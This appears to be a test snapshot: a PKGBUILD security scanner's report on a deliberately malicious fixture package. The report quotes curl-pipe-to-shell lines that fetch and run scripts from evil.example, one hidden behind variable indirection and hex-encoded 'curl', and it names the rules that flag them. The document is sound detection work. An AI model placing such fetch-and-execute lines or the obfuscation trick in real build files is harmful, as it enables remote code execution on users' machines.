@@ -1,0 +1,45 @@
+
+Scan Results: var-indirection
+============================================================
+
+[CRITICAL] DLE-001 Curl pipe to shell
+    Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.
+    Location: tests/fixtures/malicious/var-indirection/PKGBUILD:17
+    Code:     $dl -fsSL https://evil.example/stage2.sh | bash    [resolved →     curl -fsSL https://evil.example/stage2.sh | bash]
+    Recommendation: Download scripts first, review them, then execute
+    Reference: CWE-94
+
+[CRITICAL] DLE-001 Curl pipe to shell
+    Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.
+    Location: tests/fixtures/malicious/var-indirection/PKGBUILD:23
+    Code:     $c -s https://evil.example/p | sh    [resolved →     curl -s https://evil.example/p | sh]
+    Recommendation: Download scripts first, review them, then execute
+    Reference: CWE-94
+
+[HIGH] OBF-003 Hex-encoded payload
+    Hex encoding can hide malicious payloads
+    Location: tests/fixtures/malicious/var-indirection/PKGBUILD:22
+    Code:     c=$(printf '\x63url')
+    Recommendation: Decode and review hex-encoded content
+    Reference: CWE-506
+
+[HIGH] FUNC-001 Network access in build function
+    Function 'build' contains network access command 'curl'
+    Location: tests/fixtures/malicious/var-indirection/PKGBUILD:14
+    Recommendation: Network access should happen in source= array, not build functions
+
+[MEDIUM] SRC-005 No sources with build function
+    Package has build() function but no source array
+    Recommendation: Verify this is intentional; build() usually needs sources
+
+
+
+============================================================
+Package: var-indirection v1.0.0-1
+Scan duration: 5ms
+
+Found 5 issue(s):
+  2 CRITICAL
+  2 HIGH
+  1 MEDIUM
+============================================================
